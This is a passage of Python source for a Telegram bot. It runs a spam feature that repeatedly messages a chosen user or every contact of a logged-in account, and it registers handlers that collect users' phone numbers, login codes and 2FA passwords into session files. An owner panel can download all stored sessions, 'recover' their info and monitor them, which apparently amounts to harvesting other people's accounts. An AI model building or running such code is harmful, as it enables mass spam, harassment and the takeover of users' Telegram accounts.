                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_spam")]]))
        context.user_data['msg_target_type'] = 'single'
        return MSG_TARGET
    elif choice == "msg_all_dialogs":
        await query.edit_message_text("⚠️ सभी डायलॉग्स (जिनसे पहले बात हुई) को मैसेज जाएगा। 'हाँ' टाइप करो / Message will go to all dialogs. Type 'yes':\n\n🔙 Back",
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_spam")]]))
        context.user_data['msg_target_type'] = 'all'
        return MSG_TARGET
    elif choice == "cancel_spam":
        await query.edit_message_text("🚫 स्पैम कैंसल किया / Spam cancelled")
        await start(query, context)
        return ConversationHandler.END
    elif choice == "main_menu":
        await start(query, context)
        return ConversationHandler.END

async def msg_target_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if context.user_data.get('msg_target_type') == 'single':
        context.user_data['target_single'] = text
        await update.message.reply_text("✏️ अब मैसेज टाइप करो / Now type the message:\n\n🔙 Back",
                                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_spam")]]))
        return MSG_TEXT
    elif context.user_data.get('msg_target_type') == 'all':
        if text.lower() not in ['yes', 'हाँ']:
            await update.message.reply_text("🚫 रद्द किया / Cancelled")
            return ConversationHandler.END
        await update.message.reply_text("✏️ मैसेज टाइप करो / Type the message:\n\n🔙 Back",
                                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_spam")]]))
        return MSG_TEXT
    else:
        await update.message.reply_text("Error")
        return ConversationHandler.END

async def msg_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text
    context.user_data['msg_text'] = msg_text
    await update.message.reply_text("🔢 कितनी बार भेजना है? (1-10) / How many times? (1-10):\n\n🔙 Back",
                                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_spam")]]))
    return MSG_COUNT

async def msg_count_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        repeat = int(update.message.text.strip())
        if repeat < 1 or repeat > 10:
            raise ValueError
    except:
        await update.message.reply_text("❌ 1-10 के बीच संख्या डालो / Enter number 1-10")
        return MSG_COUNT

    repeat_count = repeat
    session_file = context.user_data['sender_session_file']
    target_type = context.user_data['msg_target_type']
    msg_text = context.user_data['msg_text']

    await update.message.reply_text("⏳ स्पैम मैसेज भेज रहा हूँ... कृपया इंतज़ार करो / Sending spam messages... Please wait.")
    client = TelegramClient(str(session_file), API_ID, API_HASH)
    await client.connect()
    stats = {"total": 0, "success": 0, "fail": 0}

    try:
        if target_type == 'single':
            target = context.user_data['target_single']
            try:
                if target.startswith('@'):
                    entity = await client.get_entity(target)
                elif target.isdigit():
                    entity = await client.get_entity(int(target))
                else:
                    entity = await client.get_entity(target)
            except Exception as e:
                await update.message.reply_text(f"❌ यूजर नहीं मिला / User not found: {e}")
                await client.disconnect()
                return ConversationHandler.END
            for i in range(repeat_count):
                try:
                    await client.send_message(entity, msg_text)
                    stats["success"] += 1
                except Exception as e:
                    stats["fail"] += 1
                stats["total"] += 1
                await asyncio.sleep(1)
        elif target_type == 'all':
            dialogs = await client.get_dialogs()
            users = [d.entity for d in dialogs if d.is_user and not d.entity.is_self]
            if not users:
                await update.message.reply_text("❌ कोई डायलॉग नहीं मिला / No dialogs found")
                await client.disconnect()
                return ConversationHandler.END
            stats["total"] = len(users) * repeat_count
            for user in users:
                for i in range(repeat_count):
                    try:
                        await client.send_message(user, msg_text)
                        stats["success"] += 1
                    except Exception as e:
                        stats["fail"] += 1
                    await asyncio.sleep(1)
        await client.disconnect()
        report = f"✅ **स्पैम रिपोर्ट / Spam Result**\n📤 कुल / Total: {stats['total']}\n✔️ सफल / Success: {stats['success']}\n❌ असफल / Failed: {stats['fail']}"
        await update.message.reply_text(report, parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ त्रुटि / Error: {e}")
        await client.disconnect()
    finally:
        context.user_data.clear()
        return ConversationHandler.END

async def cancel_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    query = update.callback_query
    if query:
        await query.answer()
        await query.edit_message_text("🚫 स्पैम रद्द किया / Spam cancelled")
        await start(query, context)
    else:
        await update.message.reply_text("🚫 रद्द किया / Cancelled")
    return ConversationHandler.END

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # Cancel all ongoing operations
    context.user_data.clear()
    await start(query, context)

# =================== USER TEXT HANDLERS ===================
async def handle_user_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "➕ नया सेशन बनाएँ / Create Session":
        await create_session_start(update, context)
    elif text == "ℹ️ मेरी जानकारी / My Info":
        await my_info(update, context)
    elif text == "💬 Spam Message 🚀":
        await spam_message_menu(update, context)
    elif text == "📂 Read Session File":
        await session_read_command(update, context)
    elif text == "👑 ओनर पैनल / Owner Panel" and update.effective_user.id == OWNER_ID:
        await start(update, context)

# =================== MAIN ===================
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    # Conversation: Session creation
    conv_creation = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^➕ नया सेशन बनाएँ / Create Session$'), create_session_start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_session_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_session_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_session_password)],
        },
        fallbacks=[CallbackQueryHandler(cancel_conv, pattern='^cancel_conv$'), CommandHandler("cancel", cancel_conv)]
    )
    app.add_handler(conv_creation)

    # Conversation: Spam message
    conv_spam = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^💬 Spam Message 🚀$'), spam_message_menu)],
        states={
            MSG_CHOICE: [CallbackQueryHandler(msg_choice_handler, pattern='^(msg_single|msg_all_dialogs|cancel_spam|main_menu)$')],
            MSG_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, msg_target_handler)],
            MSG_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, msg_text_handler)],
            MSG_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, msg_count_handler)],
        },
        fallbacks=[CallbackQueryHandler(cancel_spam, pattern='^cancel_spam$'), CommandHandler("cancel", cancel_spam)]
    )
    app.add_handler(conv_spam)

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("recover", recover_single_command))
    app.add_handler(CommandHandler("cancel", cancel_conv))

    # Callbacks
    app.add_handler(CallbackQueryHandler(check_join_callback, pattern='^check_join$'))
    app.add_handler(CallbackQueryHandler(get_session_file_callback, pattern='^getfile_'))
    app.add_handler(CallbackQueryHandler(admin_broadcast_target, pattern='^broadcast_\\d+$'))
    app.add_handler(CallbackQueryHandler(set_channel_step, pattern='^set_channel$'))
    app.add_handler(CallbackQueryHandler(remove_channel, pattern='^remove_channel$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: u.answer(), pattern='^cancel_broadcast$'))
    app.add_handler(CallbackQueryHandler(main_menu_callback, pattern='^main_menu$'))
    app.add_handler(CallbackQueryHandler(cancel_upload, pattern='^cancel_upload$'))

    # Text handlers
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex('^(👥 सभी एक्टिव सेशन|🗑 सेशन डिलीट|🔄 फोर्स चेक|📨 ब्रॉडकास्ट|🔧 चैनल सेटिंग|📥 Download All Sessions|📋 Recover All Info|📂 Read Session File|📱 मुख्य मेनू|👑 ओनर पैनल)$'), handle_owner_text))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_text))

    # File upload handler for session read
    app.add_handler(MessageHandler(filters.Document.ALL, handle_session_file_upload))

    # Job: health check every 10 minutes
    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(session_health_check, interval=600, first=10)

    # Start monitors for existing sessions
    loop = asyncio.get_event_loop()
    loop.create_task(start_all_session_monitors())

    print("🤖 Bot is running with full features (emojis, spam, session read for all)...")
    app.run_polling()

if __name__ == "__main__":
    main()